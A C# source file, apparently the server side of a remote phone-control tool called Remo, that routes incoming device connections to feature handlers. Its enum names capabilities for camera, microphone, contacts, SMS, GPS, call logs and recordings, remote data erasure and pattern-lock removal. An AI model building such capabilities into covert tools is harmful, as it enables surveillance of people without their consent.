using Remo.Features;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Remo.Connections
{

    static class DataHandler
    {
        public static void distribute(int dataType,int Flag,byte[] data, IMConnection c)
        {
            try {
                c.LastChecked = DateTime.Now;
                if (dataType == (int)eDataType.INIT_CONNECTION)
                {
                    int Connection_type, Feature_type;
                    Console.WriteLine(Encoding.UTF8.GetString(data));
                    Int32.TryParse(Encoding.UTF8.GetString(data).Split(',')[0], out Connection_type);
                    Int32.TryParse(Encoding.UTF8.GetString(data).Split(',')[1], out Feature_type);
                    if (Connection_type == (int)eConnectionType.Main)
                    {
                        //try
                        //{
                            mTCPHandler.GetInstance().MainConnectionsDict.Remove((c.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString());
                            mTCPHandler.GetInstance().MainConnectionsDict.Add((c.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString(), c);
                        //}
                        //catch(Exception ex)
                        //{
                        //    Console.WriteLine("MainConnectionsDict Add Exception: "+ex.Message);
                        //    throw new Exception();
                        //}
                    }
                    else if (Connection_type == (int)eConnectionType.Feature)
                    {
                        IFConnection fc = mTCPHandler.GetInstance().getClientByIP((c.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString()).FeatureClients[Feature_type];
                        fc.tcpClient = c.tcpClient;
                        mTCPHandler.GetInstance().FeatureConnectionsMapDict.Remove(
                            c.tcpClient.Client.RemoteEndPoint.ToString());

                        mTCPHandler.GetInstance().FeatureConnectionsMapDict.Add(
                            c.tcpClient.Client.RemoteEndPoint.ToString(),
                            mTCPHandler.GetInstance().getClientByIP(
                                (c.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString()));
                    }
                }

                else {
                    try
                    {
                        IFConnection fc = (IFConnection)c;
                        fc.F.onDataReceived(0 , data);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("No Feature Found Exception " + ex.Message);
                        Console.WriteLine("DataType " + dataType);
                        Console.WriteLine("Time Since Run : " + (DateTime.Now - mTCPHandler.GetInstance().DateStarted));
                        throw new Exception();
                    }
                }
            }catch(Exception ex)
            {
                Console.WriteLine("Distribute Exeption: " + ex.Message);
                throw new Exception();
            }
            

        }
        public enum eConnectionType
        {
            Main,
            Feature
        }

        public enum eOrderType
        {
            START,
            STOP,
            UPDATE,
            ONE_SHOT
        }
        public enum eDataType
        {
            INIT_CONNECTION,
            INFO,
            CAM,
            MIC,
            FM_LIST,
            FM_DOWN,
            CONTACTS,
            SMS,
            GPS,
            CALL_LOG,
            CALL_RECORDS,
            ERASE_DATA,
            REMOVE_PATTERN_LOCK,
            MAKE_NOISE,
            ERROR
        }
    }
}
